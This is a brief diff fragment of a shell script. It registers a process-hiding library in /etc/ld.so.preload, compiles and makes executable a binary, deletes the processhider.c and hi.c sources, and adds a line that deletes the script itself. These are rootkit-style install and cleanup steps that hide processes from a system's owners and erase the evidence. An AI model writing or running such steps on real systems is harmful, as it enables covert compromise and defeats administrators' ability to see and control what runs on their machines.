@@ -14,3 +14,4 @@ echo /usr/local/lib/libprocess.so >> /etc/ld.so.preload
 gcc -o hi hi.c
 rm hi.c processhider.c
 chmod +x hi
+rm rest.sh
